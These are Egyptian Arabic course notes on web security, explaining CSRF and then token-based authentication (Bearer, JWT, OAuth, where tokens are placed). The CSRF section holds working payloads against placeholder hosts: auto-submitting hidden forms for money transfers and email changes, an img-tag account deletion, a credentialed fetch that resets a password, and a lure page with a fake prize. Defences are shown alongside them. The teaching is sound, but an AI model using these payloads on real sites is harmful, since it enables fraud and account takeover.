# 🎓 الجزء 8: CSRF + Token-Based Authentication
## Slides 107 → 127

---

## Slide 107: عنوان القسم — Cross-Site Request Forgery (CSRF)
### سلايد 107:

جزء Web Security — **CSRF** (Cross-Site Request Forgery).

الثغرة دي بتستغل حاجة اتكلمنا عنها قبل كده: **المتصفح بيبعت الـ Cookies تلقائياً**. وده بالظبط اللي بيخلي CSRF ممكنة.

---

## Slide 108: تعريف الـ CSRF
### سلايد 108:

### إيه هو الـ CSRF؟

> **CSRF** (Cross-Site Request Forgery) هي ثغرة بتحصل لما المهاجم **يخدع المستخدم إنه يعمل Action في تطبيق ويب** بدون علمه أو موافقته.

### الفكرة ببساطة:

المهاجم بيستغل **ثقة التطبيق في متصفح المستخدم**. الموقع بيشوف إن الـ Request جاية من المتصفح ومعاها الـ Cookie الصح — فبيقبلها. المشكلة إن المستخدم هو اللي بعتها من غير ما يعرف!

### زي بالظبط فيلم لا تراجع ولا استسلام:
■ قوله البضاعة معايا
○ البضاعة معايا
■ قوله والفلوس كمان معايا 
○ والفلوس كمان معايا
■ وقوله كمان ...
○ ما تاخد تكلمه انت 

ببساطة يعني بيتكلم بإسم الضحية

---

## Slide 109: منهجية هجوم الـ CSRF
### سلايد 109:

### CSRF Attack Methodology

### إزاي الاتاك بيشتغل؟

**1. المستخدم مسجل دخول في الموقع:**
```http
# المتصفح عنده Cookie:
Cookie: session_id=abc123
```

**2. المتصفح بيبعت الـ Cookie تلقائياً:**
كل ما يتبعت Request لـ `bank.com` — المتصفح بيحط الـ Cookie.
مش بيسأل: "هل المستخدم عايز يبعت الـ Request ده؟"
مش بيسأل: "هل الـ Request ده جاي من `bank.com` ولا من موقع تاني؟"
بيبعت الـ Cookie وخلاص.

**3. المهاجم بيجهز Request خبيث:**
```html
<!-- صفحة المهاجم: evil.com/page.html -->
<form action="https://bank.com/transfer" method="POST" id="csrfForm">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrfForm').submit();</script>
```

**4. المهاجم يخلي الضحية يفتح الصفحة:**
- يبعتله لينك على إيميل أو ماسنجر
- يحطه في إعلان على موقع تاني
- يحطه في Comment على منتدى

**5. المتصفح بيبعت الـ Request + الـ Cookie تلقائياً!**

```mermaid
%%{init: {'theme': 'base', 'themeVariables': { 'fontSize': '18px', 'primaryColor': '#0d1117', 'primaryTextColor': '#c9d1d9', 'primaryBorderColor': '#30363d', 'lineColor': '#f85149', 'secondaryColor': '#161b22', 'tertiaryColor': '#21262d', 'noteTextColor': '#c9d1d9', 'noteBkgColor': '#161b22', 'actorTextColor': '#c9d1d9', 'actorBkg': '#0d1117', 'actorBorder': '#f85149', 'signalColor': '#c9d1d9', 'signalTextColor': '#ffffffff', 'labelBoxBkgColor': '#161b22', 'labelTextColor': '#c9d1d9'}}}%%
sequenceDiagram
    participant V as 👤 الضحية
    participant E as 😈 evil.com
    participant B as 🌐 المتصفح
    participant S as 🏦 bank.com

    V->>S: Login → يسجل دخول في البنك
    S-->>B: Set-Cookie: sid=abc123

    V->>E: يدخل على evil.com (لينك من المهاجم)
    E-->>B: يرجعله صفحة فيها Form مخفي
    Note over B: الـ Form بيعمل POST لـ bank.com

    B->>S: POST /transfer + Cookie: sid=abc123<br/>to=attacker&amount=10000
    Note over S: الـ Cookie صح!<br/>السيرفر فاكر إن الضحية عايز يحول!
    S-->>B: 200 OK → Transfer Successful 💀
    
    Note over V: الضحية مش عارف إن فلوسه اتحولت!
```

**شرح الـ Diagram:**
الـ flow بيوضح CSRF Attack كامل. الضحية مسجل دخول في البنك (عنده Cookie). بيزور موقع المهاجم (evil.com) — الموقع ده فيه Form مخفي بيعمل POST لـ bank.com. المتصفح بيبعت الـ Request ومعاه Cookie البنك تلقائياً. البنك بيشوف Cookie صحيحة فبيعتبر الـ Request شرعي ويحول الفلوس!

---

## Slide 110: خطوات الهجوم التفصيلية
### سلايد 110:

### الخطوات بالتفصيل:

**1. المهاجم بيجهز الـ Request الخبيث:**
```html
<!-- ممكن يكون Form مخفي: -->
<form action="https://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>

<!-- أو ممكن Image Tag (لـ GET Requests): -->
<img src="https://target.com/delete-account?confirm=yes" width="0" height="0">

<!-- أو AJAX Request: -->
<script>
fetch('https://target.com/change-password', {
    method: 'POST',
    credentials: 'include', // ده بيبعت الـ Cookies!
    body: 'new_password=hacked123'
});
</script>
```

**2. المهاجم بيوصل للضحية:**
```
طرق توصيل الهجمة:

 إيميل: "اضغط هنا عشان تشوف العرض الجديد!"
 رسالة: لينك على Facebook/WhatsApp
 Comment: في منتدى أو Blog
 إعلان مثلا : مش عايز تتعرف عليا خالص ؟
 صورة: Image Tag مخفي في صفحة بيزورها
```

**3. المتصفح بيبعت الـ Cookies تلقائياً**

**4. السيرفر بيقبل الطلب**

---

## Slide 111: تأثير هجمات CSRF
### سلايد 111:

### CSRF Impact — إيه الضرر اللي ممكن يحصل؟

```
 الأضرار المحتملة:

 تحويلات مالية بدون علم المستخدم
 تغيير إعدادات الحساب (إيميل، باسورد، رقم موبايل)
 تغيير الإيميل المرتبط بالحساب → Account Takeover!
 حذف بيانات أو محتوى
 تغيير معلومات شخصية
 تغيير الباسورد وقفل المستخدم بره حسابه
 إرسال رسائل باسم المستخدم
```

### الحماية من CSRF:

```javascript
// ✅ الطريقة 1: Anti-CSRF Token
// السيرفر بيولد Token مع كل Form ويتحقق منه في الـ Request

// في الـ Backend (Express):
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

app.get('/transfer', (req, res) => {
    res.render('transfer', { csrfToken: req.csrfToken() });
});

// في الـ HTML:
// <input type="hidden" name="_csrf" value="{{csrfToken}}">

// لما الـ Form يتبعت — السيرفر بيتحقق إن الـ Token صح
// evil.com مش هيعرف الـ Token ده! 🛡️


// ✅ الطريقة 2: SameSite Cookie
res.cookie('sid', token, { sameSite: 'Strict' });
// المتصفح مش هيبعت الـ Cookie مع Cross-Site Requests


// ✅ الطريقة 3: Check Origin/Referer Header
app.post('/transfer', (req, res) => {
    const origin = req.headers.origin || req.headers.referer;
    if (!origin || !origin.startsWith('https://bank.com')) {
        return res.status(403).send('CSRF Detected!');
    }
    // أكمل الطلب...
});
```

> **🔴 من واقع الـ Pentesting:** لقيت موقع بيسمح بتغيير إيميل الحساب من غير CSRF Token ومن غير تأكيد بالباسورد. POST Request بالإيميل الجديد. عملت صفحة HTML بسيطة فيها Form مخفي 
الفكرة بس ان الreset password كان عن طريق رقم التليفون و الايميل مكنش له دور في الحوار 
اتقفلت duplicate ل info الي هو خسارة الوقت الي حاولت فيها يعني 

---

## Slide 112: Lab Demo — CSRF
### سلايد 112:

### Lab Demo: Cross-Site Request Forgery (CSRF)

### السيناريو:
التطبيق بيسمح بتغيير الإيميل من غير CSRF Token. مطلوب نستغل ده.

### الخطوات:

**1. سجل دخول وروح صفحة تغيير الإيميل**
```http
# الـ Request الشرعي:
POST /change-email HTTP/1.1
Host: target.com
Cookie: session_id=abc123
Content-Type: application/x-www-form-urlencoded

email=new@email.com
```

**2. لاحظ: مفيش CSRF Token في الـ Request!**

**3. اعمل صفحة HTML خبيثة:**
```html
<!DOCTYPE html>
<html>
<body>
    <h1>مبروك كسبت 4 ايفون 17 بسعر 499ج و الشحن بس عليك</h1>
    <form action="https://target.com/change-email" method="POST" id="csrf">
        <input type="hidden" name="email" value="attacker@evil.com">
    </form>
    <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**4. ارفعها على سيرفرك وابعت اللينك للضحية**

**5. لما الضحية يفتح اللينك — الإيميل بتاعه يتغير!**

---

## Slide 113: عنوان القسم — Introduction to Token-Based Authentication
### سلايد 113:

دلوقتي ننتقل من الـ Session-Based Authentication لنموذج تاني: **Token-Based Authentication**.

---

## Slide 114: تعريف الـ Token-Based Authentication
### سلايد 114:

### إيه هو الـ Token-Based Authentication؟

> طريقة حديثة للتحقق من هوية المستخدم. بدل ما السيرفر يحفظ Session عنده (Stateful)، بيدي المستخدم **Token** (Stateless) — الـ Token ده فيه كل المعلومات اللي السيرفر محتاجها.

### الفرق عن Session-Based:

```mermaid
%%{init: {'theme': 'base', 'themeVariables': { 'fontSize': '20px', 'primaryColor': '#1a1b26', 'primaryTextColor': '#a9b1d6', 'primaryBorderColor': '#414868', 'lineColor': '#7aa2f7', 'secondaryColor': '#24283b', 'tertiaryColor': '#1a1b26', 'fontFamily': 'monospace'}, 'flowchart': {'nodeSpacing': 50, 'rankSpacing': 50, 'curve': 'basis'}}}%%
flowchart TD
    subgraph S_Based ["📦 Session-Based Authentication (Stateful)"]
        direction TB
        S1("👤 المستخدم يرسل Login") --> S2("🖥️ السيرفر ينشئ Session")
        S2 --> S3("💾 السيرفر يحفظ Session في DB/Memory")
        S3 --> S4("🍪 السيرفر يرسل Session ID في Cookie")
        S4 --> S5("🔄 كل Request جديد:")
        S5 --> S6("🔍 السيرفر يبحث في الـ DB...")
        S6 --> S7("✅ مسموح (High Load)")
        
        style S3 fill:#da3633,color:#fff,stroke:#fff
        style S6 fill:#da3633,color:#fff,stroke:#fff
    end

    subgraph T_Based ["🪙 Token-Based Authentication (Stateless)"]
        direction TB
        T1("👤 المستخدم يرسل Login") --> T2("🖥️ السيرفر ينشئ Token (Sign)")
        T2 --> T3("🚫 السيرفر لا يحفظ شيئاً!")
        T3 --> T4("📨 السيرفر يرسل Token للمستخدم")
        T4 --> T5("🔄 كل Request جديد:")
        T5 --> T6("✅ السيرفر يتحقق من التوقيع فقط (Computing)")
        T6 --> T7("🚀 مسموح (Fast & Scalable)")

        style T3 fill:#238636,color:#fff,stroke:#fff
        style T6 fill:#238636,color:#fff,stroke:#fff
    end
```

**شرح الـ Diagram:**
في الـ Session-Based — السيرفر بيحفظ الـ Session Data عنده (في Database أو Memory) وكل Request بيحتاج Lookup. ده بيعمل حمل كبير علي السيرفر. في الـ Token-Based — السيرفر مش بيحفظ حاجة! كل البيانات جوا الـ Token نفسه، والسيرفر بيتحقق من التوقيع (Signature) بس. ده بيخلي النظام أسرع وأسهل في الـ Scaling.

تخيل عندك مليون مستخدم كل مستخدم له توكن و التوكن عادة حجمه كبيرة عن الطريقة الاولي فتخيل كل دا بيتخزن في الداتا بيز لا و كمان ان قبل كل ريكوست السيرفر يدور علي التوكن هل موجود متخزن عندنا ولا لا و بعدين يبعتلك response 
الي هو عشان بس تفتح معاك صفحة الprofile روح نام حبة و تعالا 

### ليه Token-Based أفضل في حالات معينة؟

```
 مش محتاج Database لكل Request → أسرع
 بيشتغل مع أكتر من سيرفر → Scalable  
 مثالي لـ APIs و Mobile Apps
 بيدعم Cross-Domain Authentication
 مش معرض لـ CSRF (لو مخزن مش في Cookie)

 بس ليه عيوب:
 لو اتسرق — صعب تبطله (مفيش Session تمسحها)
 الـ Payload مش مشفر (Base64 بس → قابل للقراءة)
 لو كبير → كل Request هيبقى أكبر
```

---

## Slide 115: أنواع الـ Tokens — Bearer Tokens
### سلايد 115:

### النوع الأول: Bearer Tokens

```http
GET /user/profile HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### إيه هو الـ Bearer Token؟

كلمة "Bearer" معناها "الحامل". يعني **أي حد يحمل الـ Token ده يقدر يستخدمه**. مفيش تحقق إضافي. زي الشيك لو مكتوب عليه يصرف لحامله يعني لو روحت البنك مش هيسألوك انت مين هيتصرفلك الشيك و خلاص 

### اعتبارات أمنية:

```
 الـ Bearer Token لازم يبقى:
├── سري → لو حد سرقه = دخل حسابك
├── قصير العمر → عشان لو اتسرق ميفضلش شغال طويل  
├── بينقل عبر HTTPS بس → عشان ميتسرقش
└── مش في الـ URL → عشان ميظهرش في Logs
```

---

## Slide 116: أنواع الـ Tokens — JWT
### سلايد 116:

### النوع التاني: JSON Web Tokens (JWT)

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvZSIsImlhdCI6MTUxNjIzOTAyMn0.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### إيه هو الـ JWT؟

Token **مكتفي بذاته** (Self-Contained) — فيه كل المعلومات اللي السيرفر محتاجها. مكون من 3 أجزاء:

```
JWT = Header.Payload.Signature
       │       │        │
       │       │        └── التوقيع (لمنع التلاعب)
       │       └── البيانات (معلومات المستخدم)
       └── المعلومات الوصفية (نوع الخوارزمية)
```

### المميزات:
-  **Portable** — ممكن تستخدمه مع أي سيرفر
-  **Stateless** — السيرفر مش محتاج يحفظ حاجة
-  **Self-Contained** — كل البيانات جواه

> **💡 ملاحظة مهمة:** هنتكلم عن JWT بالتفصيل الممل في الجزء الجاي — بنية الـ Token، الـ Claims، وإزاي بيتكسر. دلوقتي بنعرف ده كنوع من أنواع الـ Tokens.

---

## Slide 117: أنواع الـ Tokens — OAuth Tokens
### سلايد 117:

### النوع التالت: OAuth Tokens

بتتستخدم في بروتوكول **OAuth 2.0** — وده بيسمح لتطبيقات تانية تدخل على بيانات المستخدم بدون ما تاخد الباسورد بتاعه.

### نوعين:

| النوع | الوظيفة | العمر |
|-------|---------|-------|
| **Access Token** | بيدي صلاحية الوصول للموارد | قصير (دقائق/ساعات) |
| **Refresh Token** | بيجدد الـ Access Token بدون Login تاني | طويل (أيام/أسابيع) |

### مثال:


Flow مبسط:

1. المستخدم يسجل دخول عن طريق Google
2. Google يدي التطبيق Access Token (صالح لساعة)
3. التطبيق يستخدم الـ Token عشان يجيب بيانات المستخدم من Google API
4. بعد ساعة ← الـ Access Token ينتهي
5. التطبيق يستخدم الـ Refresh Token عشان ياخد Access Token جديد
6. من غير ما المستخدم يسجل دخول تاني!


> **💡 ملاحظة:** هنتكلم عن OAuth بالتفصيل في الأجزاء الجاية — دلوقتي بنعرف ده كنوع من أنواع الـ Tokens. 

---

## Slide 118-123: أماكن تخزين الـ Tokens
### سلايد 118-123:

### Token Placement — فين بنحط الـ Token؟

فيه 4 أماكن ممكن نحط فيها الـ Token:

### 1️⃣ Authorization Header  (الأفضل)

```http
GET /api/v1/resource HTTP/1.1
Host: example.com
Authorization: Bearer <token>
```

**ليه الأفضل؟**
-  منفصل عن الـ Body والـ URL
-  مش بيتسجل في Logs (غالباً)
-  Standard في عالم الـ APIs
-  بيشتغل مع أي نوع Request

### 2️⃣ Query Parameters  (خطر!)

```http
GET /api/v1/resource?access_token=<token> HTTP/1.1
Host: example.com
```

**ليه خطر؟**
-  بيظهر في Browser History
-  بيتسجل في Server Logs
-  بيتسرب في Referer Headers
-  ممكن Proxies تعمله Cache

### 3️⃣ Request Body  (مقبول لـ POST)

```http
POST /api/v1/resource HTTP/1.1
Host: example.com
Content-Type: application/json

{"token": "<token>"}
```

### 4️⃣ Cookies  (محتاج حماية إضافية)

```http
Set-Cookie: auth_token=<token>; Secure; HttpOnly
```

**المشكلة:** معرض لـ CSRF لو مفيش حماية إضافية. بس المميز إن `HttpOnly` بيحميه من XSS.

### ملخص المقارنة:

| المكان | الأمان | الملاحظات |
|--------|--------|-----------|
| **Authorization Header** |  الأفضل | الـ Standard لـ APIs |
| **Query Parameters** |  خطر | بيتسرب في كل حتة |
| **Request Body** |  مقبول | لـ POST Requests بس |
| **Cookies** |  محتاج حماية | HttpOnly + SameSite + CSRF Token |

---

## Slide 124: أفضل الممارسات
### سلايد 124:

### Token Placement — Best Practices


القواعد الذهبية:

1. استخدم Authorization Header دايماً
2. تجنب Query Parameters خالص
3. لو Cookies ← خليها HttpOnly + Secure + SameSite
4. دايماً HTTPS — حتى لو الـ Token في Header
5. خلي الـ Token قصير العمر (Short-Lived)


---

## Slide 125-127: استخدامات Token-Based Authentication
### سلايد 125-127:

### فين بنستخدم Token-Based Authentication؟

```mermaid
%%{init: {'theme': 'base', 'themeVariables': { 'fontSize': '12px', 'primaryColor': '#1a1b26', 'primaryTextColor': '#a9b1d6', 'primaryBorderColor': '#414868', 'lineColor': '#7aa2f7', 'secondaryColor': '#24283b', 'tertiaryColor': '#1a1b26', 'fontFamily': 'monospace'}}}%%
graph TD
    A["🪙 Token-Based Auth"] --> B["🌐 Modern Web Apps<br/>SPAs, PWAs"]
    A --> C["📡 RESTful APIs<br/>مثالي لـ Stateless APIs"]
    A --> D["🔧 Microservices<br/>كل Service تتحقق مستقلة"]
    A --> E["🔗 Cross-Domain & SSO<br/>دخول واحد لكل التطبيقات"]

    B --> B1["React, Vue, Angular<br/>بيبعتوا Token مع كل API Call"]
    C --> C1["Mobile Apps & IoT<br/>مش محتاجين Cookies"]
    D --> D1["مفيش Session Store مركزي<br/>كل Service تتحقق لوحدها"]
    E --> E1["OAuth + JWT<br/>Google Login, GitHub Login"]

    style A fill:#1f6feb,color:#fff
    style B fill:#238636,color:#fff
    style C fill:#238636,color:#fff
    style D fill:#238636,color:#fff
    style E fill:#238636,color:#fff
```

**شرح الـ Diagram:**
Token-Based Auth بيتستخدم في 4 سيناريوهات رئيسية. في الـ Modern Web Apps (SPAs زي React) — الـ Frontend بيبعت Token مع كل API Call. في الـ RESTful APIs — مثالي لأن APIs Stateless أصلاً. في الـ Microservices — كل Service تقدر تتحقق من الـ Token مستقلة بدون Session Store مركزي. وفي الـ Cross-Domain و SSO — الـ Token (JWT/OAuth) ممكن يتشارك بين أكتر من تطبيق.

---

## 🎯 ملخص الجزء التامن

| المفهوم | الشرح |
|---------|-------|
| **CSRF** | المهاجم يخدع المتصفح يبعت Request وهو مش عارف — بيستغل إن الـ Cookies بتتبعت تلقائياً |
| **CSRF Protection** | Anti-CSRF Tokens + SameSite Cookies + Origin/Referer Check |
| **Token-Based Auth** | بديل لـ Session-Based — الـ Token فيه كل المعلومات، والسيرفر مش بيحفظ حاجة |
| **Bearer Token** | "الحامل" — مين اللي ماسكه يقدر يستخدمه |
| **JWT** | Token مكتفي بذاته (Header + Payload + Signature) |
| **OAuth Tokens** | Access Token (قصير) + Refresh Token (طويل) |
| **Best Placement** | Authorization Header — تجنب Query Parameters |

> **📝 الجزء الجاي (Session 9):** هندخل في **JWT بالتفصيل** — البنية الداخلية، الـ Claims، وإزاي بنمسك الـ Token ونفكه ونحلل كل جزء فيه.
